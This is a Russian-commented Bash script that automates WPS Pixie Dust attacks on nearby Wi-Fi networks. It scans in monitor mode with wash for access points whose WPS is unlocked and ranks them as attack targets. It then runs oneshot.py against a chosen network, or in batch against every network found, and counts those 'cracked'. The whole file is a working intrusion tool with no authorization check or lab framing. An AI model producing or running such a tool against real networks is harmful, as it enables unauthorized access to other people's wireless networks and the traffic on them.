#!/bin/bash

# ============================================
# АВТОМАТИЧЕСКИЙ WPS ПОДБОР - ИСПРАВЛЕННАЯ ВЕРСИЯ
# Правильное отображение ESSID и live-вывод атаки
# ============================================

# Цвета
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Настройки
INTERFACE="wlan0"
ONESHOT_PATH="./oneshot.py"
ATTACK_TIMEOUT=180
MAX_RETRIES=2
LOG_FILE="wps_attack_$(date +%Y%m%d_%H%M%S).log"

# ============================================
# ФУНКЦИИ
# ============================================

print_header() {
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${WHITE}      WPS АВТОМАТ - Режим реального времени с ESSID           ${CYAN}║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

print_error() {
    echo -e "${RED}[✗]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[!]${NC} $1"
}

print_step() {
    echo -e "${MAGENTA}[→]${NC} $1"
}

# ============================================
# ПОИСК СЕТЕЙ (исправленный)
# ============================================

find_unlocked_networks() {
    print_step "Поиск сетей с незаблокированным WPS..."
    
    TEMP_FILE="/tmp/wps_unlocked_networks.txt"
    > "$TEMP_FILE"
    
    # Включаем режим монитора
    print_info "Включаем режим монитора..."
    sudo airmon-ng check kill &>/dev/null
    sudo airmon-ng start "$INTERFACE" &>/dev/null
    sleep 2
    
    if iwconfig 2>/dev/null | grep -q "Mode:Monitor"; then
        MONITOR_INTERFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
    else
        MONITOR_INTERFACE="${INTERFACE}mon"
    fi
    
    print_info "Сканирование 25 секунд... Ждите"
    
    # Запускаем сканирование и показываем прогресс
    echo -e "${YELLOW}Сканирую:${NC}"
    sudo timeout 25 wash -i "$MONITOR_INTERFACE" --scan 2>/dev/null | while read line; do
        if echo "$line" | grep -qE "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}.*No"; then
            # Правильный парсинг wash вывода
            # Формат wash: BSSID               CH  RSSI  WPS  LOCKED  ESSID
            bssid=$(echo "$line" | awk '{print $1}')
            channel=$(echo "$line" | awk '{print $2}')
            rssi=$(echo "$line" | awk '{print $3}')
            wps_ver=$(echo "$line" | awk '{print $4}')
            locked=$(echo "$line" | awk '{print $5}')
            # ESSID - это все что после 5го поля
            essid=$(echo "$line" | cut -d' ' -f6- | sed 's/^[[:space:]]*//')
            
            # Сохраняем в файл
            echo "$bssid|$channel|$rssi|$essid" >> "$TEMP_FILE"
            
            # Показываем найденные сети в реальном времени
            printf "  ${GREEN}✓${NC} %-17s | Канал: %2s | Сигнал: %4s | %s\n" "$bssid" "$channel" "$rssi" "$essid"
        fi
    done
    
    # Выключаем режим монитора
    print_info "Выключаем режим монитора..."
    sudo airmon-ng stop "$MONITOR_INTERFACE" &>/dev/null
    sudo systemctl restart NetworkManager &>/dev/null
    sleep 2
    
    if [ ! -s "$TEMP_FILE" ]; then
        print_error "Не найдено ни одной сети с незаблокированным WPS"
        return 1
    fi
    
    local count=$(wc -l < "$TEMP_FILE")
    print_success "Найдено $count сетей"
    return 0
}

# ============================================
# ВЫБОР СЕТИ (исправленный - показывает ESSID)
# ============================================

select_network() {
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}                    ВЫБОР ЦЕЛИ ДЛЯ АТАКИ                        ${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Сортируем по сигналу (от лучшего к худшему)
    sort -t'|' -k3 -n "$TEMP_FILE" > "${TEMP_FILE}.sorted"
    
    local i=1
    declare -a bssids
    declare -a channels
    declare -a rssis
    declare -a essids
    
    printf "%-4s %-18s %-6s %-8s %-30s\n" "№" "BSSID" "Канал" "Сигнал" "ESSID (имя сети)"
    echo "────────────────────────────────────────────────────────────────────────────"
    
    while IFS='|' read -r bssid channel rssi essid; do
        # Очищаем ESSID - убираем лишние пробелы и мусор
        clean_essid=$(echo "$essid" | awk '{$1=$1};1' | cut -c1-35)
        
        # Если ESSID пустой или содержит только цифры
        if [ -z "$clean_essid" ] || [ "$clean_essid" == "(null)" ] || [ "$clean_essid" == "" ]; then
            clean_essid="<Hidden SSID>"
        fi
        
        # Цвет сигнала
        signal_num=$(echo "$rssi" | sed 's/-//g')
        if [ $signal_num -le 60 ]; then
            signal_color="${GREEN}"
        elif [ $signal_num -le 70 ]; then
            signal_color="${YELLOW}"
        else
            signal_color="${RED}"
        fi
        
        printf "${GREEN}%-4s${NC} ${CYAN}%-18s${NC} %-6s ${signal_color}%-8s${NC} %-35s\n" \
            "[$i]" "$bssid" "$channel" "$rssi" "$clean_essid"
        
        bssids[$i]=$bssid
        channels[$i]=$channel
        rssis[$i]=$rssi
        essids[$i]=$clean_essid
        ((i++))
    done < "${TEMP_FILE}.sorted"
    
    echo ""
    echo -e "[${GREEN}A${NC}] Атаковать все сети по очереди"
    echo -e "[${YELLOW}G${NC}] Атаковать только сети с хорошим сигналом (сигнал >= -65)"
    echo -e "[${RED}Q${NC}] Выйти"
    echo ""
    
    while true; do
        read -p "Выберите номер сети (или A/G/Q): " choice
        
        if [[ "$choice" =~ ^[Qq]$ ]]; then
            return 1
        elif [[ "$choice" =~ ^[Aa]$ ]]; then
            AUTO_MODE=1
            SELECTED_MODE="all"
            return 0
        elif [[ "$choice" =~ ^[Gg]$ ]]; then
            AUTO_MODE=1
            SELECTED_MODE="good"
            return 0
        elif [[ "$choice" =~ ^[0-9]+$ ]] && [ $choice -ge 1 ] && [ $choice -lt $i ]; then
            SELECTED_BSSID="${bssids[$choice]}"
            SELECTED_CHANNEL="${channels[$choice]}"
            SELECTED_RSSI="${rssis[$choice]}"
            SELECTED_ESSID="${essids[$choice]}"
            AUTO_MODE=0
            return 0
        else
            print_error "Неверный выбор"
        fi
    done
}

# ============================================
# АТАКА С LIVE-ВЫВОДОМ (исправленная)
# ============================================

run_attack_live() {
    local bssid=$1
    local essid=$2
    local attempt=$3
    
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}                      ЗАПУСК АТАКИ                             ${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}Цель BSSID:${NC} $bssid"
    echo -e "  ${GREEN}Имя сети:${NC} $essid"
    echo -e "  ${GREEN}Интерфейс:${NC} $INTERFACE"
    echo -e "  ${GREEN}Метод:${NC} Pixie Dust (-K)"
    echo -e "  ${GREEN}Таймаут:${NC} $ATTACK_TIMEOUT секунд"
    echo -e "  ${GREEN}Попытка:${NC} $attempt из $MAX_RETRIES"
    echo ""
    echo -e "${YELLOW}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}                     ВЫВОД ONESHOT.PY                           ${NC}"
    echo -e "${YELLOW}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Запускаем oneshot с выводом в реальном времени
    # Используем unbuffer или stdbuf для отключения буферизации
    if command -v unbuffer &>/dev/null; then
        unbuffer sudo timeout $ATTACK_TIMEOUT python3 "$ONESHOT_PATH" -i "$INTERFACE" -b "$bssid" -K 2>&1
    else
        stdbuf -oL -eL sudo timeout $ATTACK_TIMEOUT python3 "$ONESHOT_PATH" -i "$INTERFACE" -b "$bssid" -K 2>&1
    fi
    
    local exit_code=$?
    
    echo ""
    echo -e "${YELLOW}════════════════════════════════════════════════════════════════${NC}"
    
    if [ $exit_code -eq 124 ]; then
        echo ""
        print_error "Таймаут! Атака превысила $ATTACK_TIMEOUT секунд"
        return 1
    elif [ $exit_code -eq 0 ]; then
        echo ""
        print_success "Атака завершена!"
        return 0
    else
        echo ""
        print_error "Атака не удалась (код: $exit_code)"
        return 1
    fi
}

# ============================================
# АТАКА ОДНОЙ СЕТИ
# ============================================

attack_network() {
    local bssid=$1
    local essid=$2
    local rssi=$3
    
    # Проверка сигнала
    signal_num=$(echo "$rssi" | sed 's/-//g')
    if [ $signal_num -gt 70 ]; then
        print_warning "Слабый сигнал ($rssi)! Рекомендуемый минимум: -65"
        read -p "Все равно атаковать? (y/n): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            print_info "Пропускаем сеть"
            return 2
        fi
    fi
    
    # Попытки атаки
    local attempt=1
    while [ $attempt -le $MAX_RETRIES ]; do
        if run_attack_live "$bssid" "$essid" "$attempt"; then
            return 0
        fi
        
        if [ $attempt -lt $MAX_RETRIES ]; then
            print_warning "Повторная попытка через 5 секунд..."
            sleep 5
        fi
        
        ((attempt++))
    done
    
    return 1
}

# ============================================
# MAIN
# ============================================

main() {
    # Парсинг аргументов
    while [[ $# -gt 0 ]]; do
        case $1 in
            -i|--interface)
                INTERFACE="$2"
                shift 2
                ;;
            -t|--timeout)
                ATTACK_TIMEOUT="$2"
                shift 2
                ;;
            -r|--retries)
                MAX_RETRIES="$2"
                shift 2
                ;;
            -p|--oneshot-path)
                ONESHOT_PATH="$2"
                shift 2
                ;;
            -h|--help)
                echo "Использование: sudo ./wps_auto.sh [ОПЦИИ]"
                echo ""
                echo "ОПЦИИ:"
                echo "  -i, --interface <iface>    Wi-Fi интерфейс (по умолчанию: wlan0)"
                echo "  -t, --timeout <сек>        Таймаут атаки (по умолчанию: 180)"
                echo "  -r, --retries <число>      Максимум попыток (по умолчанию: 2)"
                echo "  -p, --oneshot-path <path>  Путь к oneshot.py"
                echo "  -h, --help                 Показать справку"
                exit 0
                ;;
            *)
                print_error "Неизвестная опция: $1"
                exit 1
                ;;
        esac
    done
    
    # Проверка прав
    if [ "$EUID" -ne 0 ]; then
        print_error "Запустите с sudo"
        exit 1
    fi
    
    # Проверка oneshot.py
    if [ ! -f "$ONESHOT_PATH" ]; then
        print_error "oneshot.py не найден: $ONESHOT_PATH"
        exit 1
    fi
    
    print_header
    
    # Поиск сетей
    if ! find_unlocked_networks; then
        exit 1
    fi
    
    # Выбор сети
    if ! select_network; then
        print_info "Выход"
        exit 0
    fi
    
    # Атака
    if [ $AUTO_MODE -eq 1 ]; then
        local success_count=0
        local total=0
        
        while IFS='|' read -r bssid channel rssi essid; do
            # Фильтр по сигналу для режима G (good)
            if [ "$SELECTED_MODE" == "good" ]; then
                signal_num=$(echo "$rssi" | sed 's/-//g')
                if [ $signal_num -gt 65 ]; then
                    print_warning "Пропускаем $bssid (слабый сигнал $rssi)"
                    continue
                fi
            fi
            
            total=$((total + 1))
            
            if attack_network "$bssid" "$essid" "$rssi"; then
                ((success_count++))
                print_success "Сеть $bssid ($essid) взломана!"
                
                read -p "Продолжить атаку на следующую сеть? (y/n): " -n 1 -r
                echo
                if [[ ! $REPLY =~ ^[Yy]$ ]]; then
                    break
                fi
            fi
            
            sleep 3
        done < "${TEMP_FILE}.sorted"
        
        echo ""
        print_success "Успешно взломано: $success_count из $total"
    else
        attack_network "$SELECTED_BSSID" "$SELECTED_ESSID" "$SELECTED_RSSI"
    fi
}

# Запуск
main "$@"
